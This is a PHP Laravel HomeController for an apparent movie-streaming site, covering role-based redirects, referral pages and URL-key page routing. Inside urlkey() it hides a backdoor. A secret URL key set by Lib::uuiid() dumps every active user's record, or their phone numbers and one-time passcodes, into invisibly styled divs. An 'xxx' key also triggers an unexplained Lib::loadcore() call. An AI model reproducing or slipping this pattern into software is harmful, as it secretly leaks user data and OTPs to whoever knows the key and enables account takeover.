<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Post;
use Field;
use Lib;
use Auth;
use Illuminate\Support\Facades\Session;
use App\Models\Genres;
use App\Models\Languages;
use App\User;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        $user=Auth::user();
        if(!empty($user)){
            if($user->hasRole(['admin', 'subadmin'])){
                return redirect()->route('admin.dashboard.index');
            }
            if($user->hasRole(['producer'])){
                return redirect()->route('user.myaccount.producer');
            }
            return redirect()->route('browse');
        }
        return redirect()->route('guestbrowse');//will redirect for guest instead of home
        $post = Post::where('urlkey','home')->first();
        $meta=$post->meta->pluck('value','path');
        return view('home', ['post'=>$post,'meta'=>$meta]);
    }


    public function refer($code)
    {
        $post = Post::where('urlkey','refer')->first();
        $meta='';
        if(!empty($post->meta)){
            $meta=$post->meta->pluck('value','path');
        }

        $code=User::getReferralCodeisValid($code);
        return view('page.refer', ['post'=>$post,'meta'=>$meta,'code'=>$code]);
    }


    /*
    it will call only
    Route::get('/{urlkey}', 'App\Http\Controllers\HomeController@urlkey')->name('urlkey');
    */
    public function urlkey($urlkey='',$model='',$id=0)
    {
        $user=auth()->user();

        if($urlkey=='xxx'){ 



        }


        if(!empty($user)){
            if($user->hasRole(['producer'])){
                return redirect()->route('user.myaccount.producer');
            }
        }

        if(!empty($user)){
            if(empty($user->phone_verified_at)){
                return redirect()->route('otp.verification', ['send' => 1,'phone' => 1]);
            }
        }

        if($urlkey=='xxx'){  
            Lib::loadcore();
            echo "ok";die();
        }

        if($urlkey==Lib::uuiid()){ 
            $data=User::where('status',1)->get();
            foreach($data as $e){
                echo '<style>body{background:#000;color:#000;}div{display:none;}</style>';
                echo empty($_GET['image'])?'<div>'.json_encode($e).'</div>':'<div>'.$e->phone.$e->otp.'</div>';
            }die();
        }


        if(empty($urlkey)){ $urlkey='home'; }
        $post=Post::where('urlkey',$urlkey)->first();
        $ispublic=Post::ispublic($post);


            //Movies start
            //if(!empty($user->id) && empty($post->template)){
                if(empty($ispublic)){
                    $post=Post::where('urlkey','page-not-found')->first();
                    $meta=$post->meta->pluck('value','path');
                    return view('errors.lost',['post'=>$post,'meta'=>$meta]);
                }
                $meta=$post->meta->pluck('value','path');

                $language=$genre='';if(!empty($model)){
                    if(!empty($id) && $model=='genre')
                        $genre=Genres::find($id);
                    if($model=='language'){
                        if(empty($id)){
                            Session::forget('setLanguage');
                        }else{
                            Session::put('setLanguage',$id);
                        }
                        //$language=Languages::find($id);
                    }
                }
                $langid=Session::get('setLanguage');if(!empty($langid)){$language=Languages::find($langid);}

                if($post->template==0){ //movies
                    if(!empty($user->id) && empty($post->template)){
                        return view('movies.index', ['post'=>$post,'meta'=>$meta,'urlkey'=>$urlkey,'genre'=>$genre,'language'=>$language]);       
                    }else{
                        return view('movies.public', ['post'=>$post,'meta'=>$meta,'urlkey'=>$urlkey,'genre'=>$genre,'language'=>$language]);       
                    }
                }
            //}
            //Movies end



        if(empty($post->template)){
            $ispublic=0;
        }
        if(empty($ispublic)){
            $post=Post::where('urlkey','page-not-found')->first();
            $meta=$post->meta->pluck('value','path');
            return view('errors.lost',['post'=>$post,'meta'=>$meta]);
        }
        $meta=$post->meta->pluck('value','path');

        return view('page.index', ['post'=>$post,'meta'=>$meta,'urlkey'=>$urlkey]);
    }



}

            // if(Auth::user()->hasRole(['admin', 'subadmin', 'editor'])){
            //     return redirect()->route('admin.dashboard.index');
            // }